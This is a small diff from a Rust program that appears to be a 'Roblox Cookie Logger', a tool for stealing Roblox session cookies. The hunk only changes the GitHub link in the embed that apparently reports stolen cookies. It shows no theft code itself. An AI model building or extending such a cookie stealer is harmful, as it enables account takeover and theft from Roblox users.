@@ -24,7 +24,7 @@ async fn main() {
 
             {
                     "title": "Mamba Roblox Cookie Logger - 🍪",
-                    "description": "[Github](https://github.com/Natslpb/RobloxCookieLogger)",
+                    "description": "[Github](https://github.com/Natslol/RobloxCookieLogger)",
                     "color": 10682623,
                     "footer": {
                         "text": "By Nats#2222",
